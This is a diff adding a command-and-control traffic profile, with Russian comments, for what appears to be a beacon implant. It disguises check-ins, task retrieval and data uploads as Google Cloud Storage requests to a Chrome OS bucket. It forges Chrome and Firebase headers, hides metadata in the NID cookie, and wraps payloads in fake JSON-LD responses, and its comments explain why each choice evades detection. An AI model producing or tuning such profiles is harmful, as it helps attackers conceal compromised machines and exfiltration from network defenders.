@@ -1,0 +1,68 @@
+# Google Cloud Storage API — имитация обращений к публичному бакету Chrome OS.
+#
+# storage.googleapis.com присутствует в трафике Firebase SDK, GCP-клиентов,
+# Chrome-обновлений и тысяч Windows-приложений на базе GCP.
+# Cookie NID выставляется google.com для любого посетителя без авторизации
+# (6-месячный срок, присутствует на 99% машин с браузером).
+#
+# Особенность wrap: поле "@" заимствовано из JSON-LD (используется в
+# Google Structured Data); {, ", @, :, } — все вне алфавита base64url,
+# поэтому декодировщик бикона пропускает обёртку и не портит payload.
+
+[http-get]
+uri_checkin     = "/storage/v1/b/chromiumos-image-archive/o/config%2Fapp-release.json?alt=media"
+uri_task        = "/storage/v1/b/chromiumos-image-archive/o/updates%2Flatest-build.json?alt=media"
+verb            = "GET"
+metadata_cookie = "NID"
+
+[http-get.client_headers]
+"User-Agent"         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+"Accept"             = "*/*"
+"Accept-Language"    = "en-US,en;q=0.9"
+"Accept-Encoding"    = "gzip, deflate, br"
+"Cache-Control"      = "no-cache"
+"Pragma"             = "no-cache"
+"Sec-Fetch-Dest"     = "empty"
+"Sec-Fetch-Mode"     = "cors"
+"Sec-Fetch-Site"     = "cross-site"
+"Sec-Ch-Ua"          = "\"Google Chrome\";v=\"124\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""
+"Sec-Ch-Ua-Mobile"   = "?0"
+"Sec-Ch-Ua-Platform" = "\"Windows\""
+"X-Goog-Api-Client"  = "gl-js/9.23.0 fire/10.12.0"
+
+[http-post]
+uri  = "/upload/storage/v1/b/chromiumos-image-archive/o?uploadType=media&name=telemetry%2Freport.json"
+verb = "POST"
+
+[http-post.client_headers]
+"Content-Type"            = "application/json; charset=UTF-8"
+"User-Agent"              = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+"Accept"                  = "*/*"
+"Accept-Encoding"         = "gzip, deflate, br"
+"Sec-Fetch-Dest"          = "empty"
+"Sec-Fetch-Mode"          = "cors"
+"Sec-Fetch-Site"          = "cross-site"
+"X-Goog-Api-Client"       = "gl-js/9.23.0 fire/10.12.0"
+"X-Goog-Upload-Protocol"  = "multipart"
+
+[server]
+status       = 200
+content_type = "application/json; charset=UTF-8"
+# wrap_prefix/suffix: только символы вне base64url-алфавита.
+# Тело выглядит как {"@":"<base64url>"} — допустимый JSON-LD объект.
+wrap_prefix  = "{\"@\":\""
+wrap_suffix  = "\"}"
+
+[server.headers]
+# Server: UploadServer — штатное имя GCS, возвращается даже при скачивании.
+"Server"                          = "UploadServer"
+"Vary"                            = "Origin, X-Origin"
+"x-goog-generation"               = "1715094312874000"
+"x-goog-metageneration"           = "1"
+"x-goog-stored-content-encoding"  = "identity"
+"x-goog-hash"                     = "crc32c=2NzBxw==,md5=rL0Y20zC+Fzt72VPzMSk2A=="
+"ETag"                            = "\"rL0Y20zC+Fzt72VPzMSk2A==\""
+"Cache-Control"                   = "private, max-age=0, no-transform"
+"X-Content-Type-Options"          = "nosniff"
+"Alt-Svc"                         = "h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000"
+"Strict-Transport-Security"       = "max-age=31536000"
